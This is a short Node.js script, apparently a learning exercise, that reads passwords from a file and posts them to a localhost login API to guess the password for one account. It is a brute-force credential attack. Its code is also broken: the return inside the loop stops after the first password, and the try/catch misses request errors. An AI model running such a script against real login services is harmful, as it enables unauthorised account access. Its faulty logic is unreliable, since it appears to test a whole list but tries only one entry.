const fs = require('fs');
const request = require('superagent');
let rawPasswords = fs.readFileSync(__dirname + '/password.txt', 'utf8');
let passwords = rawPasswords.split('\n');


const hackMaster = (arrayOfPasswords) => {
  
  for(let i = 0; i < arrayOfPasswords.length; i++){
    try {
      return request
        .post('http://localhost:7890/api/v1/auth/login')
        .send({ email: 'matt@matt.com', password: `${arrayOfPasswords[i]}` })
        .then(res => {
          console.log(i);
          if(res.body.email === 'matt@matt.com') {
            console.log('YOU\'RE IN!!!!!', 'Correct Password:', arrayOfPasswords[i]);
          } else {
            console.log(i, 'Incorrect password');
          }
        });
    }
    catch(error) {
      console.log(error);
    }
  }
        
    
};
hackMaster(passwords);

